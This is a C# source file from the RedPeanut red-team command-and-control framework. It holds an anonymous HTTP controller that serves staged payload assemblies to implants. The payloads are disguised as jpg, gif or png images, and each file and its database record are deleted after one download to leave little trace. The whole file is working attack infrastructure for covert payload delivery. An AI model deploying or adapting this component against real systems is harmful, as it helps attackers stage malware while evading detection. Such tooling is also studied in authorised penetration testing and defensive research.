//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using OpenMcdf;
using static RedPeanut.Utility;

namespace RedPeanut
{
    

    [AllowAnonymous]
    public class HttpImageController : ControllerBase
    {

        private readonly RedPeanutDBContext dbContext = new RedPeanutDBContext(new DbContextOptions<RedPeanutDBContext>());

        private readonly IHttpContextAccessor httpContextAccessor;

        public HttpImageController(IHttpContextAccessor httpContextAccessor)
        {
            this.httpContextAccessor = httpContextAccessor;
        }

        [AllowAnonymous]
        [HttpGet()]
        public ActionResult<string> Get(string filename)
        {
            //Console.WriteLine("[*] Get content");
            // Api call used to deliver payload
            if (string.IsNullOrEmpty(filename))
            {

                Console.WriteLine("[x] File not found: null or empty filename");
                return NotFound();
            }

            if (RedPeanutC2.server.GetWebResource(filename, dbContext) == null)
            {
                Console.WriteLine("[x] File not found: resource not found");
                return NotFound();
            }
            else
            {
                try
                {

                    string file = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, ASSEMBLY_OIUTPUT_FOLDER, SanitizeFilename(filename));

                    if (!System.IO.File.Exists(file))
                    {
                        Console.WriteLine("[x] Assembly requested not found");
                        Models.WebResource webResource = RedPeanutC2.server.GetWebResource(filename, dbContext);
                        Console.WriteLine("[x] {0} {1} {2} {3}", webResource.Uri, webResource.WebResourceType, webResource.FileName, webResource.Content);
                        return NotFound();
                    }
                    else
                    {
                        try
                        {
                            byte[] resurce = System.IO.File.ReadAllBytes(file);
                            string contenttype = "";

                            switch (filename.Split('.')[filename.Split('.').Length -1])
                            {
                                case "jpg":
                                    contenttype = "image/jpg";
                                    break;
                                case "gif":
                                    contenttype = "image/gif";
                                    break;
                                case "png":
                                    contenttype = "image/png";
                                    break;
                                default :
                                    contenttype = "image/jpg";
                                    break;
                            }

                            RedPeanutC2.server.RemoveWebResource(RedPeanutC2.server.GetWebResource(filename, dbContext), dbContext);
                            System.IO.File.Delete(file);

                            return File(resurce, contenttype);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("[x] Error reading assembly");
                            return NotFound();
                        }
                       
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("[x] Generic error");
                    return NotFound();
                }
            }
        }

        private string SanitizeFilename(string filename)
        {
            return filename.Replace("\\", "")
                .Replace("/", "")
                .Replace("..", "");
        }
    }
}